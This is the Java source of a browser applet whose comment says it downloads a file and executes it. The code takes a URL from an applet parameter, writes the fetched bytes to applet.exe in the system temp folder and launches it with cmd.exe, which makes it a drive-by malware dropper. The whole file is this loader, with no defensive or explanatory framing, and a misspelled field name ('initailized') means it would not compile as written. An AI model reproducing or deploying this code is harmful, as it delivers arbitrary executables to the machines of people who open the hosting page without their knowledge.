/**
*       This applet will download a file and execute it
**/

import java.applet.*;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.util.*;

public class Java extends Applet
{
        private Object initialized = null;
        public Object isInitialized()
        {
                return initailized;
        }

        public void init()
        {
                Process f;
        try
        {
                String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;
                String expath = tmpdir + "applet.exe";
                String download = "";
                download = getParameter("1");
                if (download.length() > 0)
                {
                        // URL Parameter
                        URL url = new URL(download);
                        // Get an input stream for reading
                        InputStream in = url.openStream();
                        // Create a buffered input stream for efficiency
                        BufferedInputStream bufIn = new BufferedInputStream(in);
                        File outputFile = new File(expath);
                        OutputStream out = new BufferedOutputStream(new FileOutputStream(outputFile));
                        byte[] buffer = new byte[2048];
                        for (;;)
                        {
                                int nBytes = bufIn.read(buffer);
                                if (nBytes <= 0) break;
                                        out.write(buffer, 0, nBytes);
                                }
                                out.flush();
                                out.close();
                                in.close();
                                // Execute downloaded file
                                f = Runtime.getRuntime().exec("cmd.exe /c " + expath);
                        }
        } catch(IOException e) {
                e.printStackTrace();
        } catch(Exception exception) {
                exception.printStackTrace();
        }
}
}
